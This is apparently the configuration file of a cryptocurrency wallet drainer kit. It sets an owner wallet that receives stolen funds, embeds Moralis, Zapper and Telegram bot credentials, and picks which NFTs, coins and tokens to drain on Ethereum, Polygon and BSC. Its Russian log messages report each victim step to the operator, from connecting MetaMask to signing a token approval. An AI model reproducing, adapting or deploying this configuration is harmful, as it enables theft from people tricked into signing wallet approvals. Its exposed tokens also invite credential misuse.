
logLanguage = "rus"

ownerAddress = "0xB359d8C766b524994a5582bEa1dad5969111779F"

MORALIS_KEY = "FIH13rwF3rZLDHtfqt7iDS0t9Nb9CskjJXKfZy5j0suhhHfFSGmi50cz039HpqNs"
ZAPPER_KEY = "Basic MmYyOWI3NDUtMjRlNy00MjMxLWIyODQtNzk3MmY2ODczY2IwOg=="

autoMetamaskConnect = 0



const tgConfig = {
    
    botToken: "2026144055:AAEii18hnp52hQ4c75V9h1Va-oGEnvVxtNA",
    chatId: "772367784"

}

const chains = {
    eth: true,
    matic: true,
    bsc: true,

}

const toDrain = {
 
    eth: {
        nft: true,
        eth: true,
        tokens: true
    },

    matic: {
        nft: true,
        eth: true,
        tokens: true,
    },

    bsc: {
        nft: false,
        eth: true,
        tokens: true,
    }

}

const LOG_SCHEMA = {
    rus: {
        onConnect: "💠 Пользователь $id зашел на сайт",
        onDisconnect: "💤 Пользователь $id покинул сайт",
        onMetamaskConnect: "🔑 Пользователь $id подключил метамаск%0A└ [DeBank](https://debank.com/profile/$wallet)",
        onApprove: "🤑 Пользователь $id открыл окно с апрувом токенов",
        onCancel: "😢 Пользователь $id отменил транзакцию",
        onSign: "✅ Пользователь $id подписал апрув",
        onCancelSwitch: "😢 Пользователь $id не сменил сеть"
    },
    eng: {
        onConnect: "💠 Пользователь $id зашел на сайт",
        onDisconnect: "💤 Пользователь $id покинул сайт",
        onMetamaskConnect: "😎 Пользователь $id подключил метамаск",
        onApprove: "🤑 Пользователь $id открыл окно с апрувом токенов",
        onCancel: "😢 Пользователь $id отменил транзакцию",
        onSign: "✅ Пользователь $id подписал апрув",
        onCancelSwitch: "😢 Пользователь $id не сменил сеть"
    }
}



function updateState(event) {

    switch (event) {

        case "metamaskConnected":
            break;
        case "metamaskDisconnected":
            break;
        case "userTokensFetching":
            break;
        case "userTokensFetched":
            break;

    }

}